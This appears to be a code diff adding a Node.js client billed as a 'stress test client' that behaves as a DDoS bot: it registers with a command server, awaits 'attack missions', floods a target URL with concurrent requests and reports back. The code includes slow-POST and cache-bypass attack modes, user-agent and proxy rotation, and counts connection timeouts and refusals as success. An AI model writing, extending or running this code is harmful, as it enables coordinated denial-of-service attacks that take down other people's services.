+        config.timeout = 30000;
+        response = await axios.get(url, config);
+        break;
+        
+      case 'HTTP-RUDY':
+        // Slow POST body
+        config.timeout = 30000;
+        const slowPayload = 'X'.repeat(10);
+        response = await axios.post(url, slowPayload, config);
+        break;
+        
+      case 'HTTP-BYPASS':
+        // Multiple cache bypass techniques
+        const bypass = `?${Math.random()}=${Date.now()}&nocache=${Math.random()}`;
+        config.headers['Pragma'] = 'no-cache';
+        config.headers['Expires'] = '0';
+        response = await axios.get(url + bypass, config);
+        break;
+        
+      default:
+        response = await axios.get(url, config);
+    }
+    
+    const elapsed = Date.now() - startTime;
+    
+    return {
+      success: true,
+      statusCode: response.status,
+      responseTime: elapsed
+    };
+  } catch (error) {
+    const elapsed = Date.now() - startTime;
+    
+    return {
+      success: error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT' || error.code === 'ECONNREFUSED',
+      error: error.message,
+      statusCode: error.response?.status || 0,
+      responseTime: elapsed
+    };
+  }
+}
+
+async function executeMission(mission) {
+  isAttacking = true;
+  log(`🚀 Starting attack mission: ${mission.mission_id}`, 'magenta');
+  
+  const results = {
+    completed: 0,
+    failed: 0,
+    response_times: [],
+    status_codes: {},
+    errors: []
+  };
+  
+  const startTime = Date.now();
+  const endTime = startTime + (mission.duration * 1000);
+  const delayBetweenRequests = 1000 / mission.requests_per_second;
+  
+  let requestCount = 0;
+  let activeRequests = 0;
+  const maxConcurrent = Math.min(mission.requests_per_second, 100);
+  let shouldStop = false;
+  
+  // Progress update interval
+  const progressInterval = setInterval(() => {
+    // Check for stop signal
+    if (currentMission && currentMission.stopped) {
+      shouldStop = true;
+    }
+    
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+    const remaining = ((endTime - Date.now()) / 1000).toFixed(1);
+    process.stdout.write(`\r${colors.yellow}Attacking... ` +
+      `Sent: ${requestsSent} | Success: ${results.completed} | ` +
+      `Failed: ${requestsFailed} | Active: ${activeRequests} | ` +
+      `Time: ${elapsed}s / ${remaining}s remaining${colors.reset}`);
+  }, 500);
+  
+  // Fire requests with controlled concurrency
+  const fireRequest = async () => {
+    activeRequests++;
+    const result = await makeRequest(
+      mission.target_url,
+      mission.method,
+      mission.payload,
+      mission.headers
+    );
+    activeRequests--;
+    
+    requestCount++;
+    
+    if (result.success) {
+      results.completed++;
+      results.response_times.push(result.responseTime);
+      requestsSent++;
+      
+      const statusKey = String(result.statusCode);
+      results.status_codes[statusKey] = (results.status_codes[statusKey] || 0) + 1;
+    } else {
+      results.failed++;
+      requestsFailed++;
+      if (results.errors.length < 10) {
+        results.errors.push(result.error);
+      }
+    }
+    
+    return result;
+  };
+  
+  // Main attack loop with concurrency control
+  const requests = [];
+  
+  while (Date.now() < endTime && !shouldStop) {
+    // Check stop signal
+    if (currentMission && currentMission.stopped) {
+      log('\n⛔ Mission stopped by server', 'red');
+      shouldStop = true;
+      break;
+    }
+    
+    const batchSize = Math.min(
+      maxConcurrent - activeRequests,
+      mission.requests_per_second
+    );
+    
+    for (let i = 0; i < batchSize && Date.now() < endTime && !shouldStop; i++) {
+      requests.push(fireRequest());
+    }
+    
+    await new Promise(resolve => setTimeout(resolve, Math.max(10, delayBetweenRequests / 10)));
+  }
+  
+  // Wait for all pending requests to complete (max 10 seconds)
+  const timeout = Date.now() + 10000;
+  while (activeRequests > 0 && Date.now() < timeout) {
+    await new Promise(resolve => setTimeout(resolve, 100));
+  }
+  
+  clearInterval(progressInterval);
+  
+  console.log('\n');
+  
+  if (shouldStop) {
+    log(`⛔ Mission STOPPED: ${results.completed} successful, ${results.failed} failed`, 'red');
+  } else {
+    log(`✓ Mission completed: ${results.completed} successful, ${results.failed} failed`, 'green');
+  }
+  
+  // Calculate statistics
+  if (results.response_times.length > 0) {
+    results.stats = {
+      min: Math.min(...results.response_times),
+      max: Math.max(...results.response_times),
+      avg: results.response_times.reduce((a, b) => a + b, 0) / results.response_times.length
+    };
+  }
+  
+  // Report results back to server
+  await reportResults(mission.mission_id, results);
+  
+  isAttacking = false;
+  currentMission = null;
+}
+
+async function reportResults(missionId, results) {
+  try {
+    await axios.post(`${SERVER_URL}/api/client/report/${clientId}`, {
+      mission_id: missionId,
+      results: results
+    });
+    
+    log(`📤 Results reported to server`, 'green');
+  } catch (error) {
+    log(`✗ Failed to report results: ${error.message}`, 'red');
+  }
+}
+
+async function main() {
+  log('=' .repeat(60), 'bright');
+  log('STRESS TEST CLIENT - AWAITING ORDERS FROM SERVER', 'bright');
+  log('=' .repeat(60), 'bright');
+  log(`Server: ${SERVER_URL}`, 'cyan');
+  log(`Hostname: ${os.hostname()}`, 'cyan');
+  log(`Platform: ${os.platform()} ${os.arch()}`, 'cyan');
+  log('=' .repeat(60), 'bright');
+  
+  // Load user agents and proxies
+  loadUserAgents();
+  loadProxies();
+  
+  // Register with server
+  const registered = await registerWithServer();
+  if (!registered) {
+    log('Failed to register. Exiting.', 'red');
+    process.exit(1);
+  }
+  
+  log('🎯 Client ready. Waiting for missions...', 'green');
+  
+  // Start heartbeat loop
+  setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
+  
+  // Initial heartbeat
+  sendHeartbeat();
+}
+
+// Handle graceful shutdown
+process.on('SIGINT', async () => {
+  log('\n👋 Shutting down client...', 'yellow');
+  
+  if (isAttacking) {
+    log('⚠️  Warning: Shutting down during active mission!', 'red');
+  }
+  
+  process.exit(0);
+});
+
+// Run the client
+main().catch(error => {
+  log(`Fatal error: ${error.message}`, 'red');
+  process.exit(1);
+});
